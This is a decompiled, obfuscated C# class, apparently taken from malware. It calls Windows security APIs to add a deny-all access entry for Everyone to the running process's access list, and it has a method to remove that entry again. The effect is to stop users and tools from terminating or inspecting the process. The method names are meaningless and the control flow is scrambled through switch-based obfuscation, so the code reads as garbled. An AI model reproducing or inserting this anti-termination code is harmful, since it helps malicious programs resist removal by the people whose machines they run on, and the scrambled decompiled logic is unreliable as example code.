using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

// Token: 0x02000027 RID: 39
internal class cgo
{
	// Token: 0x060000F6 RID: 246
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr GetCurrentProcess();

	// Token: 0x060000F7 RID: 247
	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool GetKernelObjectSecurity(IntPtr cgs, int cgt, [Out] byte[] cgu, uint cgv, ref uint cgy);

	// Token: 0x060000F8 RID: 248
	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool SetKernelObjectSecurity(IntPtr cgw, int cgq, byte[] cgz);

	// Token: 0x060000F9 RID: 249 RVA: 0x00023318 File Offset: 0x00021518
	private T chj<T>(ref T chk, T chl)
	{
		chk = chl;
		return chl;
	}

	// Token: 0x060000FA RID: 250 RVA: 0x00023330 File Offset: 0x00021530
	private RawSecurityDescriptor chn()
	{
		IntPtr currentProcess = cgo.GetCurrentProcess();
		byte[] array;
		for (;;)
		{
			IL_43:
			uint num = 2301013106u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 2471222919u)) % 3u)
				{
				case 0u:
					goto IL_43;
				case 2u:
					array = new byte[1];
					num = (num2 * 2866875198u ^ 800461097u);
					continue;
				}
				goto Block_1;
			}
		}
		Block_1:
		uint num3 = 0u;
		try
		{
			cgo.GetKernelObjectSecurity(currentProcess, 4, array, 0u, ref num3);
			RawSecurityDescriptor result;
			for (;;)
			{
				IL_117:
				uint num4 = 3978723045u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num4 ^ 2471222919u)) % 8u)
					{
					case 0u:
						goto IL_117;
					case 1u:
						goto IL_11E;
					case 2u:
						if ((ulong)num3 >= 0UL)
						{
							num4 = (num2 * 475466862u ^ 111462191u);
							continue;
						}
						goto IL_11E;
					case 4u:
						if ((ulong)num3 > 32767UL)
						{
							num4 = (num2 * 2135104627u ^ 3621748626u);
							continue;
						}
						goto IL_71;
					case 5u:
						goto IL_122;
					case 6u:
						goto IL_71;
					case 7u:
						result = null;
						num4 = (num2 * 4262171074u ^ 1850261228u);
						continue;
					}
					goto Block_7;
					IL_71:
					if (cgo.GetKernelObjectSecurity(currentProcess, 4, this.chj<byte[]>(ref array, new byte[checked((int)(unchecked((ulong)num3) - 1UL) + 1)]), num3, ref num3))
					{
						goto IL_124;
					}
					num4 = 3708196552u;
				}
			}
			Block_7:
			goto IL_124;
			IL_11E:
			result = null;
			IL_122:
			return result;
			IL_124:;
		}
		catch (Exception ex)
		{
		}
		return new RawSecurityDescriptor(array, 0);
	}

	// Token: 0x060000FB RID: 251 RVA: 0x0002348C File Offset: 0x0002168C
	public bool chu()
	{
		IntPtr currentProcess = cgo.GetCurrentProcess();
		try
		{
			RawSecurityDescriptor rawSecurityDescriptor = this.chn();
			bool result;
			for (;;)
			{
				IL_D4:
				uint num = 4215151244u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 3685432340u)) % 7u)
					{
					case 0u:
						goto IL_DB;
					case 1u:
						result = true;
						num = (num2 * 3000934291u ^ 2427003964u);
						continue;
					case 3u:
					{
						byte[] array = new byte[checked(rawSecurityDescriptor.BinaryLength - 1 + 1)];
						num = (num2 * 3526175995u ^ 1126669991u);
						continue;
					}
					case 4u:
						rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
						num = (num2 * 1454677033u ^ 3274880725u);
						continue;
					case 5u:
					{
						byte[] array;
						rawSecurityDescriptor.GetBinaryForm(array, 0);
						if (cgo.SetKernelObjectSecurity(currentProcess, 4, array))
						{
							num = (num2 * 1385801636u ^ 2206462401u);
							continue;
						}
						break;
					}
					case 6u:
						goto IL_D4;
					}
					goto Block_4;
				}
			}
			Block_4:
			goto IL_DD;
			IL_DB:
			return result;
			IL_DD:;
		}
		catch (Exception ex)
		{
			return false;
		}
		return false;
	}

	// Token: 0x060000FC RID: 252 RVA: 0x0002359C File Offset: 0x0002179C
	public bool chz()
	{
		IntPtr currentProcess = cgo.GetCurrentProcess();
		try
		{
			RawSecurityDescriptor rawSecurityDescriptor = this.chn();
			rawSecurityDescriptor.DiscretionaryAcl.RemoveAce(0);
			bool result;
			for (;;)
			{
				IL_8D:
				uint num = 3118165057u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 3757597024u)) % 5u)
					{
					case 0u:
						goto IL_8D;
					case 1u:
						goto IL_94;
					case 3u:
					{
						byte[] array = new byte[checked(rawSecurityDescriptor.BinaryLength - 1 + 1)];
						rawSecurityDescriptor.GetBinaryForm(array, 0);
						if (cgo.SetKernelObjectSecurity(currentProcess, 4, array))
						{
							num = (num2 * 792593474u ^ 2696392729u);
							continue;
						}
						break;
					}
					case 4u:
						result = true;
						num = (num2 * 1014572397u ^ 1994471904u);
						continue;
					}
					goto Block_4;
				}
			}
			Block_4:
			goto IL_96;
			IL_94:
			return result;
			IL_96:;
		}
		catch (Exception ex)
		{
			return false;
		}
		return false;
	}
}
